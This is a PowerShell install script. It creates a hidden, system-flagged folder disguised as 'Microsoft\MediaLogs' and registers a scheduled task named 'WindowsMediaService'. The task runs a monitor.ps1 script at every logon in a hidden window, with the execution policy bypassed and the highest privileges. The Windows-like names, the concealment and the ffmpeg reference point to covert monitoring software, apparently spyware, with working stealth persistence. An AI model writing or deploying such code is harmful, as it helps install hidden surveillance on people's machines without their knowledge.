param ([string]$OutputPath = (Join-Path $env:LOCALAPPDATA "Microsoft\MediaLogs"))

$TaskName = "WindowsMediaService"
$InstallDir = $PSScriptRoot
$MonitorScript = Join-Path $InstallDir "monitor.ps1"

# Create hidden output directory
if (-not (Test-Path $OutputPath)) {
    try {
        New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
        $folder = Get-Item $OutputPath -Force
        $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
    } catch {}
}

# Cleanup PID file
if (Test-Path (Join-Path $InstallDir "ffmpeg.pids")) {
    Remove-Item (Join-Path $InstallDir "ffmpeg.pids") -Force
}

# Remove existing task
try {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
} catch {}

# Get current user
$CurrentUser = "$env:USERDOMAIN\$env:USERNAME"

# Create scheduled task with highest privileges
try {
    $action = New-ScheduledTaskAction `
        -Execute "powershell.exe" `
        -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$MonitorScript`" -OutputDir `"$OutputPath`" -InstallDir `"$InstallDir`""

    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    $principal = New-ScheduledTaskPrincipal -UserId $CurrentUser -LogonType Interactive -RunLevel Highest

    Register-ScheduledTask `
        -TaskName $TaskName `
        -Action $action `
        -Trigger $trigger `
        -Settings $settings `
        -Principal $principal `
        -Force | Out-Null
    
    Start-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
} catch {
    exit 1
}